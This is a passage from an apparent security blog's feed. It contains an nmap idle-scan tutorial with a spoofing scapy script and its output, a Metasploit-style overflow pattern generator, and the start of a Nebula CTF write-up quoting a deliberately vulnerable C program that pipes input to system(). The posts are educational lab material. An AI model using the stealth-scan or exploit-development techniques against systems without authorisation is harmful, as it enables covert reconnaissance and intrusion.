&lt;p&gt;I am curious to see how Google's new Inbox will work for me, but right now I am
still waiting on my invite.&lt;/p&gt;
</summary><category term="[]"></category></entry><entry><title>Why it will be quiet</title><link href="http://unlogic.co.uk/2014/08/08/why-it-will-be-quiet/" rel="alternate"></link><updated>2014-08-08T16:00:00+01:00</updated><author><name>Sven Steinbauer</name></author><id>tag:unlogic.co.uk,2014-08-08:2014/08/08/why-it-will-be-quiet/</id><summary type="html">&lt;p&gt;If you are reading this in the &lt;a class="reference external" href="http://i.imgur.com/pQSJhyw.png"&gt;future&lt;/a&gt; you might
be wondering why the posts are so old and why there are no recent ones.
The simple reason is that I have had nothing to add. &amp;quot;But how did you
know this?&amp;quot; you ask. Well, I decided so. I've not been very good at adding
content recently, for the simple reason that I have nothing much to write about.&lt;/p&gt;
&lt;p&gt;You see it's quite simple really: I'm taking a step back from it all. I have a
full time job and a family. Both these things are time consuming and that
leaves little time for me to tinker, hack, code, write whatever. So I've decided
that rather than shoe horn in half-assed attempts, I'd rather just take a step
back. Going by the simple idiom of
&lt;a class="reference external" href="http://i.imgur.com/8maeRT0.jpg"&gt;&amp;quot;Anything worth doing, is worth doing right&amp;quot;&lt;/a&gt;. That doesn't mean I will be giving up coding, hacking, whatever,
completely, it just means I will be working on things that aren't really worth
writing about or that have already been written about a hundered times over.
Thus I will have little or nothing new to add to what is already available [out
there](&lt;a class="reference external" href="http://www.google.com"&gt;http://www.google.com&lt;/a&gt;).&lt;/p&gt;
&lt;p&gt;I could write about things from work, but the nature of my work doesn't really
&lt;a class="reference external" href="http://i.imgur.com/ugA8LLd.gif"&gt;allow for that&lt;/a&gt;.
I don't want to write about opinions and thoughts, because that's
not what I am about. I've tried it before and I didn't enjoy it, nor was I
&lt;a class="reference external" href="https://i.imgur.com/Ut25SPN.gif"&gt;happy with the result&lt;/a&gt;.
So with this I will leave what is here for your reference and who knows,
maybe one day there will be another post about something or other.&lt;/p&gt;
&lt;p&gt;Time to kickback and &lt;a class="reference external" href="http://i.imgur.com/rSxyNlO.gif"&gt;have a beer&lt;/a&gt; methinks.&lt;/p&gt;
&lt;p&gt;Thanks for reading&lt;a class="reference external" href="https://i.imgur.com/vG96Num.gif"&gt;.&lt;/a&gt;&lt;/p&gt;
</summary><category term="[]"></category></entry><entry><title>nmap's idle scan with scapy</title><link href="http://unlogic.co.uk/2014/07/17/nmaps-idle-scan-with-scapy/" rel="alternate"></link><updated>2014-07-17T12:00:00+01:00</updated><author><name>Sven Steinbauer</name></author><id>tag:unlogic.co.uk,2014-07-17:2014/07/17/nmaps-idle-scan-with-scapy/</id><summary type="html">&lt;p&gt;If you've used nmap before you are probably familiar with its idle scan feature.
Should you not be, go and &lt;a class="reference external" href="http://nmap.org/book/idlescan.html"&gt;skim the docs&lt;/a&gt;.
I'll quickly cover the basics here anyway.&lt;/p&gt;
&lt;p&gt;Basically it will allow us to conduct a port scan of a remote host without revealing
our IP address. This is done by making use of the fact that IP IDs are sequential.
The images below (courtesy of the namp project documentation) explain this very
well.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Open Port&lt;/strong&gt;&lt;/p&gt;
&lt;a class="reference external image-reference" href="http://i.imgur.com/MajmRTH.png"&gt;&lt;img alt="" src="http://i.imgur.com/MajmRTH.png" style="width: 400px;" /&gt;&lt;/a&gt;
&lt;p&gt;&lt;strong&gt;Closed Port&lt;/strong&gt;&lt;/p&gt;
&lt;a class="reference external image-reference" href="http://i.imgur.com/2UALzzd.png&amp;gt;"&gt;&lt;img alt="" src="http://i.imgur.com/2UALzzd.png" style="width: 400px;" /&gt;&lt;/a&gt;
&lt;p&gt;&lt;strong&gt;Filtered Port&lt;/strong&gt;&lt;/p&gt;
&lt;a class="reference external image-reference" href="http://i.imgur.com/Yv6hbwL.png"&gt;&lt;img alt="" src="http://i.imgur.com/Yv6hbwL.png" style="width: 400px;" /&gt;&lt;/a&gt;
&lt;p&gt;Ok, so that's the short version of the theory and it's relatively painless
to implement with scapy. Let's take a look at the script:&lt;/p&gt;
&lt;script src="https://gist.github.com/Svenito/e377713b90525e842266.js"&gt;&lt;/script&gt;&lt;p&gt;You provide the script with a &lt;code&gt;zombie ip&lt;/code&gt;, &lt;code&gt;target ip&lt;/code&gt;, and &lt;code&gt;target port&lt;/code&gt;.
These should be self explanatory. Then we use scapy to assemble our packets to
conduct our scan. The &lt;code&gt;p1&lt;/code&gt; SYN/ACK packet will be sent to the zombie so we can
obtain a current IP ID from the RST response as a reference.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;p2&lt;/code&gt; is a SYN packet which we send to the target with a return address of the
zombie host. When the target receives this packet it will reply to
the zombie instead of the source machine (us). The target will respond with a
SYN/ACK to the &lt;code&gt;p2&lt;/code&gt; packet, but send its response to the zombie instead of us.
Thus increasing the zobmies IP ID value by one.&lt;/p&gt;
&lt;p&gt;Then we probe the zombie again with a further SYN/ACK packet (this is &lt;code&gt;p3&lt;/code&gt;) to
find out what the new IP ID is.&lt;/p&gt;
&lt;p&gt;Now we have enough information to determine if the remote port is open or not.
We subtract the initial IP ID from the final one and print out the status of the port.&lt;/p&gt;
&lt;p&gt;So how do you use it? The important thing is to find a relative inactive machine to
use as a zombie, as you don't want the IP ID to change while you are conducting
your probe. I've had the best results with using networked printers as zombie hosts.
Unless there's a lot of print jobs going on, they are fairly idle. The printer
is at &lt;code&gt;10.20.7.1&lt;/code&gt; and I'm probing port 80 on &lt;code&gt;10.16.70.8&lt;/code&gt;.&lt;/p&gt;
&lt;pre class="code console literal-block"&gt;
&lt;span class="o"&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt; sudo ./idle_scan.py 10.20.7.1 0.16.70.8 80
&lt;span class="go"&gt;WARNING: No route found for IPv6 destination :: (no default route?)

[*] Scan 10.16.70.8 port 80 using 10.20.7.1 as zombie
[+] Zombie initial IP id 57319
[+] Zombie final IP id 57321
[+] Port 80 : open

sudo ./idle_scan.py 10.20.7.1 0.16.70.8 90
WARNING: No route found for IPv6 destination :: (no default route?)

[*] Scan 10.16.70.8 port 90 using 10.20.7.1 as zombie
[+] Zombie initial IP id 57341
[+] Zombie final IP id 57342
[+] Port 90 : closed&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;And to be sure, let's verify our findings with a proper nmap scan.&lt;/p&gt;
&lt;pre class="code console literal-block"&gt;
&lt;span class="o"&gt;&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt; nmap 10.16.70.8 -p80,90
&lt;span class="go"&gt;
Starting Nmap 5.51 ( http://nmap.org ) at 2014-07-17 13:07 BST
Nmap scan report for 10.16.70.8 (10.16.70.8)
Host is up (0.00013s latency).
PORT   STATE  SERVICE
80/tcp open   http
90/tcp closed dnsix

Nmap done: 1 IP address (1 host up) scanned in 0.04 seconds&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;Approved.&lt;/p&gt;
</summary></entry><entry><title>Exploit pattern generator</title><link href="http://unlogic.co.uk/2014/07/16/exploit-pattern-generator/" rel="alternate"></link><updated>2014-07-16T13:00:00+01:00</updated><author><name>Sven Steinbauer</name></author><id>tag:unlogic.co.uk,2014-07-16:2014/07/16/exploit-pattern-generator/</id><summary type="html">&lt;p&gt;I've been playing around with various stack exploits and have made a fair bit
of use of metasploit's pattern generation and search tools in order to find
EIP overwrite locations in an overflow string. This works very well indeed,
but I had a couple of issues: Firstly I had to have my Kali (or whatever
pentest distro) VM running. Secondly running the scripts was very slow. Go on
give them a go.&lt;/p&gt;
&lt;p&gt;I was told about &lt;a class="reference external" href="https://github.com/longld/peda"&gt;peda&lt;/a&gt; which is a
Python Exploit Development Assistance for GDB. This is great, but I am playing
some war games on either virtual machines or remote boxes where I can't install
things like this. And I didn't want to have to copy binaries around all the time
either. So I looked for some alternatives. There were (unsurprisingly) quite
a few, but they were in Perl or Ruby. I was seeking a Python implementation.&lt;/p&gt;
&lt;p&gt;&lt;a class="reference external" href="https://github.com/Svenito/exploit-pattern"&gt;So I rolled my own&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;It will generate a pattern exactly like the Metasploit one up to a maximum of
20280 characters in length. Usage is dead simple. To generate a pattern just
supply the desired length:&lt;/p&gt;
&lt;pre class="code console literal-block"&gt;
&lt;span class="gp"&gt;$&lt;/span&gt;&amp;gt; pattern.py 100
&lt;span class="go"&gt;Aa0Aa0Aa1Aa1Aa2Aa2Aa3Aa3Aa4Aa4Aa5Aa5Aa6Aa6Aa7Aa7Aa8Aa8Aa9Aa9Ab0Ab0Ab1Ab1Ab2Ab
2Ab3Ab3Ab4Ab4Ab5Ab5Ab6A&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;And to search for a pattern:&lt;/p&gt;
&lt;pre class="code console literal-block"&gt;
&lt;span class="gp"&gt;$&lt;/span&gt;&amp;gt; pattern.py Bf4
&lt;span class="go"&gt;Pattern Bf4 first occurrence at position 942 in pattern.
&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt;&amp;gt; pattern.py Bf4B
&lt;span class="go"&gt;Pattern Bf4B first occurrence at position 942 in pattern.
&lt;/span&gt;&lt;span class="gp"&gt;$&lt;/span&gt;&amp;gt; pattern.py 0x42346642
&lt;span class="go"&gt;Pattern 0x42346642 first occurrence at position 942 in pattern.&lt;/span&gt;
&lt;/pre&gt;
&lt;p&gt;As you can see it converts the hex representation to the correct pattern. The
position is &lt;strong&gt;0&lt;/strong&gt; (zero) indexed. I'll have to double check how Metasploit's version
returns the offset to match that.&lt;/p&gt;
&lt;p&gt;Not sure how often you need a pattern above 20k characters, but if you do,
let me know and I'll work on it.&lt;/p&gt;
</summary></entry><entry><title>Cracking Nebula Part 2</title><link href="http://unlogic.co.uk/2014/07/02/cracking-nebula-part-2/" rel="alternate"></link><updated>2014-07-02T22:00:00+01:00</updated><author><name>Sven Steinbauer</name></author><id>tag:unlogic.co.uk,2014-07-02:2014/07/02/cracking-nebula-part-2/</id><summary type="html">&lt;p&gt;On &lt;a class="reference external" href="http://www.exploit-exercises.com/"&gt;Exploit Exercises&lt;/a&gt; you can find a
number of CTF (Capture The Flag) VM images where you can practice your
exploiting, hacking and general computer savviness. I've been working
my way through the Nebula machine and figured I might as well write
up the process both for other's benefit if they get stuck, and also as
a sort of diary for myself, so I can refer back to any info if I need to.&lt;/p&gt;
&lt;p&gt;This continues on from &lt;a class="reference external" href="http://unlogic.co.uk/2014/06/24/cracking-nebula-part1/"&gt;part 1&lt;/a&gt;.&lt;/p&gt;
&lt;div class="section" id="level-11"&gt;
&lt;h2&gt;Level 11&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;The /home/flag11/flag11 binary processes standard input and executes a shell command.&lt;/p&gt;
&lt;p&gt;There are two ways of completing this level, you may wish to do both :-)&lt;/p&gt;
&lt;/blockquote&gt;
&lt;pre class="code C literal-block"&gt;
&lt;span class="cp"&gt;#include&lt;/span&gt; &lt;span class="cpf"&gt;&amp;lt;stdlib.h&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;
#include&lt;/span&gt; &lt;span class="cpf"&gt;&amp;lt;unistd.h&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;
#include&lt;/span&gt; &lt;span class="cpf"&gt;&amp;lt;string.h&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;
#include&lt;/span&gt; &lt;span class="cpf"&gt;&amp;lt;sys/types.h&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;
#include&lt;/span&gt; &lt;span class="cpf"&gt;&amp;lt;fcntl.h&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;
#include&lt;/span&gt; &lt;span class="cpf"&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;
#include&lt;/span&gt; &lt;span class="cpf"&gt;&amp;lt;sys/mman.h&amp;gt;&lt;/span&gt;&lt;span class="cp"&gt;
&lt;/span&gt;
&lt;span class="cm"&gt;/*
 * Return a random, non predictable file, and return the file descriptor for it.
 */&lt;/span&gt;

&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="nf"&gt;getrand&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="o"&gt;**&lt;/span&gt;&lt;span class="n"&gt;path&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="p"&gt;{&lt;/span&gt;
  &lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;tmp&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;pid&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;fd&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

  &lt;span class="n"&gt;srandom&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;time&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;NULL&lt;/span&gt;&lt;span class="p"&gt;));&lt;/span&gt;

  &lt;span class="n"&gt;tmp&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;getenv&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;TEMP&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
  &lt;span class="n"&gt;pid&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;getpid&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;

  &lt;span class="n"&gt;asprintf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;path&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;%s/%d.%c%c%c%c%c%c&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;tmp&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;pid&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="sc"&gt;'A'&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;random&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="mi"&gt;26&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="sc"&gt;'0'&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;random&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="mi"&gt;10&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt;
    &lt;span class="sc"&gt;'a'&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;random&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="mi"&gt;26&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="sc"&gt;'A'&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;random&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="mi"&gt;26&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt;
    &lt;span class="sc"&gt;'0'&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;random&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="mi"&gt;10&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="sc"&gt;'a'&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;random&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="mi"&gt;26&lt;/span&gt;&lt;span class="p"&gt;));&lt;/span&gt;

  &lt;span class="n"&gt;fd&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;open&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;path&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;O_CREAT&lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="n"&gt;O_RDWR&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mo"&gt;0600&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
  &lt;span class="n"&gt;unlink&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;path&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
  &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;fd&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;

&lt;span class="kt"&gt;void&lt;/span&gt; &lt;span class="nf"&gt;process&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;buffer&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;length&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="p"&gt;{&lt;/span&gt;
  &lt;span class="kt"&gt;unsigned&lt;/span&gt; &lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;key&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

  &lt;span class="n"&gt;key&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;length&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&lt;/span&gt; &lt;span class="mh"&gt;0xff&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

  &lt;span class="k"&gt;for&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt; &lt;span class="n"&gt;length&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="o"&gt;++&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="n"&gt;buffer&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;^=&lt;/span&gt; &lt;span class="n"&gt;key&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="n"&gt;key&lt;/span&gt; &lt;span class="o"&gt;-=&lt;/span&gt; &lt;span class="n"&gt;buffer&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;
  &lt;span class="p"&gt;}&lt;/span&gt;

  &lt;span class="n"&gt;system&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;buffer&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;

&lt;span class="cp"&gt;#define CL &amp;quot;Content-Length: &amp;quot;
&lt;/span&gt;
&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="nf"&gt;main&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;argc&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="o"&gt;**&lt;/span&gt;&lt;span class="n"&gt;argv&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="p"&gt;{&lt;/span&gt;
  &lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="n"&gt;line&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;256&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;
  &lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="n"&gt;buf&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;1024&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;
  &lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;mem&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;length&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;fd&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
  &lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;path&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

  &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;fgets&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;line&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="k"&gt;sizeof&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;line&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="n"&gt;stdin&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="nb"&gt;NULL&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="n"&gt;errx&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;reading from stdin&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
  &lt;span class="p"&gt;}&lt;/span&gt;

  &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;strncmp&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;line&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;CL&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;strlen&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;CL&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt; &lt;span class="o"&gt;!=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="n"&gt;errx&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;invalid header&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
  &lt;span class="p"&gt;}&lt;/span&gt;

  &lt;span class="n"&gt;length&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;atoi&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;line&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;strlen&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;CL&lt;/span&gt;&lt;span class="p"&gt;));&lt;/span&gt;

  &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;length&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt; &lt;span class="k"&gt;sizeof&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;buf&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;fread&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;buf&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;length&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;stdin&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;!=&lt;/span&gt; &lt;span class="n"&gt;length&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
      &lt;span class="n"&gt;err&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;fread length&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;
    &lt;span class="n"&gt;process&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;buf&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;length&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
  &lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;else&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;blue&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;length&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="n"&gt;pink&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

    &lt;span class="n"&gt;fd&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;getrand&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="n"&gt;path&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;

    &lt;span class="k"&gt;while&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;blue&lt;/span&gt; &lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
      &lt;span class="n"&gt;printf&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;blue = %d, length = %d, &amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;blue&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;length&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;

      &lt;span class="n"&gt;pink&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;fread&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;buf&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="k"&gt;sizeof&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;buf&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt; &lt;span class="n"&gt;stdin&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
